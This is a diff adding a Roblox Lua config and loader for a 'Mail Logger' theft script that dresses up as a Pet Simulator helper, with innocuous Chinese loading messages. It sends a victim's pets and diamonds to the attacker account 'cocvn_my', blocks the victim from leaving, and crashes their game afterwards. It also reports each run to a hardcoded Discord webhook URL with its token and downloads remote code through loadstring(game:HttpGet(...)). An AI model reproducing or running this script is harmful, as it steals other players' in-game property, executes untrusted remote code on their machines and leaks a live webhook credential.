@@ -1,0 +1,37 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "cocvn_my" --// Username To Send Pets To
+
+_G.GiftMessage = "hi" --// Message For The Gift To Say
+
+_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
+
+_G.UnlockPets = true --// Unlocks Locked Pets
+
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+
+_G.Crash = true --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+
+_G.Webhook = "https://discord.com/api/webhooks/1101703873833480202/X2efqwsgcLr7Aqy_Io6Rk2428f6T5RgdMgASYhMaZCTboLWRyE_i8kL5xAjZHG_xU7ay" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+
+_G.ScriptName = "宠物模拟器脚本" --// Script Name On The UI
+
+_G.Tip1 = "脚本准备中....." --// Gives You Tips On The UI
+
+_G.Tip2 = "脚本测试中...." --// Gives You Tips On The UI
+
+_G.Tip3 = "脚本加载中....." --// Gives You Tips On The UI
+
+_G.Tip4 = "脚本gui准备中...." --// Gives You Tips On The UI
+
+_G.Tip5 = "载入脚本中....." --// Gives You Tips On The UI
+
+--[[ Script ]]
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
